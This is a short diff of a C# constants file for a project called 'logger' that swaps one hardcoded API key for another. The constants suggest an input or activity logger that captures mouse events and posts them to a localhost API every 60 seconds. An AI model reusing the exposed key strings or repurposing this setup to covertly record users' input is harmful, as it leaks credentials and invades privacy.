@@ -15,7 +15,7 @@ public class Constants
     public const int WM_RBUTTONDOWN = 0x0204;
     public const String PATH = @"C:\Users\nicof\Desktop\PROJECTS\logger\log.txt";
     public const String API_URL = "http://localhost:8000/api/logger";
-    public const String API_KEY = "VR4YJ5LR6K";
+    public const String API_KEY = "H1ZEFWV9A7";
     public static String[] BANNED_PROCESS = {"TextInputHost", "ApplicationFrameHost", "SystemSettings"};
     public int MAX_CONT_EVENTS = 4098;
     public int SECONDS_API_INVOKE = 60;
